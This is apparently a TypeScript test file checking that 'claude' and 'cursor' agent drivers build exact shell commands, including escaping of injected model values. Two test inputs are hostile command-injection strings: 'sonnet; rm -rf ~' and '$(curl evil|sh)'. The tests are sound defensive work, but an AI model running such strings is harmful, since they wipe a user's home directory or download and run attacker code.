/**
 * @description Byte-identical parity tests: the `claude` / `cursor` drivers must emit exactly the
 * shell commands the legacy `buildClaudeShellCommand` / `buildCursorShellCommand` produced in
 * tools/workflows/src/bin/run-iteration.ts. The expected strings are snapshots of the legacy output
 * (structure/flags/escaping are cross-checked against tools/workflows' run-iteration.test.ts
 * assertions); nothing is imported from tools/workflows here. `p $(x)` exercises `$` neutralization.
 *
 * Cursor is the one deliberate divergence: it now also emits {@link CURSOR_MCP} to attach the
 * workspace's MCP servers headlessly (plan a08e7d24). Every cursor expectation below threads that
 * suffix in at its real position — after `--model`, before the worktree flags — so the flag ORDER
 * stays asserted, not just its presence.
 */

import { describe, expect, it } from 'vitest';
import type { DriverInvocationConfig } from '../../types/index.ts';
import { claudeDriver, cursorDriver } from '../index.ts';

const PROMPT = 'p $(x)';
// escapeForShellDoubleQuoted('p $(x)') === 'p \$(x)'
const SAFE = 'p \\$(x)';
const CLAUDE_BASE = `claude -p --permission-mode acceptEdits "${SAFE}"`;
const CURSOR_BASE = `cursor-agent --force -p "${SAFE}"`;
/** MCP-attachment flags the cursor driver appends after `--model` and before worktree flags. */
const CURSOR_MCP = ' --approve-mcps --trust';
/** Cursor's command with no model and no worktree. */
const CURSOR_CMD = `${CURSOR_BASE}${CURSOR_MCP}`;

const config = (
  extra: Omit<DriverInvocationConfig, 'iteration' | 'prompt'>,
): DriverInvocationConfig => ({ iteration: 1, prompt: PROMPT, ...extra });

describe('claude driver parity', () => {
  it('base command (no model, no worktree)', () => {
    expect(claudeDriver.buildShellCommand(config({}))).toBe(CLAUDE_BASE);
  });

  it('omits --model when model is auto', () => {
    expect(claudeDriver.buildShellCommand(config({ model: 'auto' }))).toBe(
      CLAUDE_BASE,
    );
  });

  it('omits --model when model is empty/whitespace', () => {
    expect(claudeDriver.buildShellCommand(config({ model: '  ' }))).toBe(
      CLAUDE_BASE,
    );
  });

  it('emits --model for a plain model', () => {
    expect(claudeDriver.buildShellCommand(config({ model: 'sonnet' }))).toBe(
      `${CLAUDE_BASE} --model sonnet`,
    );
  });

  it('escapes a malicious --model value', () => {
    expect(
      claudeDriver.buildShellCommand(config({ model: 'sonnet; rm -rf ~' })),
    ).toBe(`${CLAUDE_BASE} --model "sonnet; rm -rf ~"`);
  });

  it('appends -w for a named worktree', () => {
    expect(
      claudeDriver.buildShellCommand(config({ worktree: { worktree: 'wt' } })),
    ).toBe(`${CLAUDE_BASE} -w wt`);
  });

  it('appends bare -w for the flag-only worktree sentinel', () => {
    expect(
      claudeDriver.buildShellCommand(config({ worktree: { worktree: '' } })),
    ).toBe(`${CLAUDE_BASE} -w`);
  });

  it('ignores cursor-only worktree-base and skip-worktree-setup', () => {
    expect(
      claudeDriver.buildShellCommand(
        config({
          worktree: {
            skipWorktreeSetup: true,
            worktree: 'wt',
            worktreeBase: 'main',
          },
        }),
      ),
    ).toBe(`${CLAUDE_BASE} -w wt`);
  });

  it('combines model and worktree in legacy order (model before -w)', () => {
    expect(
      claudeDriver.buildShellCommand(
        config({ model: 'sonnet', worktree: { worktree: 'wt' } }),
      ),
    ).toBe(`${CLAUDE_BASE} --model sonnet -w wt`);
  });

  it('ignores a local endpoint (supportsCustomBaseUrl is false)', () => {
    expect(
      claudeDriver.buildShellCommand(
        config({
          endpoint: {
            baseUrl: 'http://localhost:11434/v1',
            configFilePath: '/tmp/oc/config.json',
            provider: 'ollama',
          },
        }),
      ),
    ).toBe(CLAUDE_BASE);
  });

  it('emits no MCP flags (the CLI attaches project .mcp.json on its own)', () => {
    const command = claudeDriver.buildShellCommand(config({}));
    expect(command).not.toContain('--approve-mcps');
    expect(command).not.toContain('--mcp-config');
    expect(command).not.toContain('--strict-mcp-config');
    expect(command).toBe(CLAUDE_BASE);
  });

  it('advertises claude capabilities and label', () => {
    expect(claudeDriver.id).toBe('claude');
    expect(claudeDriver.label).toBe('claude-code');
    expect(claudeDriver.capabilities).toEqual({
      attachesWorkspaceMcp: true,
      chatStreaming: true,
      mcpAutoApprove: false,
      permissionMode: true,
      skipWorktreeSetup: false,
      supportsCustomBaseUrl: false,
      supportsModelFlag: true,
      worktree: true,
      worktreeBase: false,
    });
  });
});

describe('cursor driver parity', () => {
  it('base command (no model, no worktree) — includes the MCP flags', () => {
    expect(cursorDriver.buildShellCommand(config({}))).toBe(CURSOR_CMD);
  });

  it('emits --model even for auto (unlike claude)', () => {
    expect(cursorDriver.buildShellCommand(config({ model: 'auto' }))).toBe(
      `${CURSOR_BASE} --model auto${CURSOR_MCP}`,
    );
  });

  it('emits --model for a plain model', () => {
    expect(cursorDriver.buildShellCommand(config({ model: 'sonnet' }))).toBe(
      `${CURSOR_BASE} --model sonnet${CURSOR_MCP}`,
    );
  });

  it('escapes a malicious --model value', () => {
    expect(
      cursorDriver.buildShellCommand(config({ model: '$(curl evil|sh)' })),
    ).toBe(`${CURSOR_BASE} --model "\\$(curl evil|sh)"${CURSOR_MCP}`);
  });

  it('appends -w, --worktree-base, and --skip-worktree-setup in legacy order', () => {
    expect(
      cursorDriver.buildShellCommand(
        config({
          worktree: {
            skipWorktreeSetup: true,
            worktree: 'wt',
            worktreeBase: 'main',
          },
        }),
      ),
    ).toBe(`${CURSOR_CMD} -w wt --worktree-base main --skip-worktree-setup`);
  });

  it('omits empty worktree-base and false skip-worktree-setup', () => {
    expect(
      cursorDriver.buildShellCommand(
        config({
          worktree: {
            skipWorktreeSetup: false,
            worktree: 'wt',
            worktreeBase: '  ',
          },
        }),
      ),
    ).toBe(`${CURSOR_CMD} -w wt`);
  });

  it('appends bare -w for the flag-only worktree sentinel', () => {
    expect(
      cursorDriver.buildShellCommand(config({ worktree: { worktree: '' } })),
    ).toBe(`${CURSOR_CMD} -w`);
  });

  it('ignores a local endpoint (supportsCustomBaseUrl is false)', () => {
    expect(
      cursorDriver.buildShellCommand(
        config({
          endpoint: {
            baseUrl: 'http://localhost:11434/v1',
            provider: 'lmstudio',
          },
        }),
      ),
    ).toBe(CURSOR_CMD);
  });

  it('advertises cursor capabilities and label', () => {
    expect(cursorDriver.id).toBe('cursor');
    expect(cursorDriver.label).toBe('cursor-agent');
    expect(cursorDriver.capabilities).toEqual({
      attachesWorkspaceMcp: true,
      chatStreaming: true,
      mcpAutoApprove: true,
      permissionMode: false,
      skipWorktreeSetup: true,
      supportsCustomBaseUrl: false,
      supportsModelFlag: true,
      worktree: true,
      worktreeBase: true,
    });
  });
});

describe('registry wiring', () => {
  it('registers claude and cursor', async () => {
    const { getDriver } = await import('../index.ts');
    expect(getDriver('claude')).toBe(claudeDriver);
    expect(getDriver('cursor')).toBe(cursorDriver);
  });
});
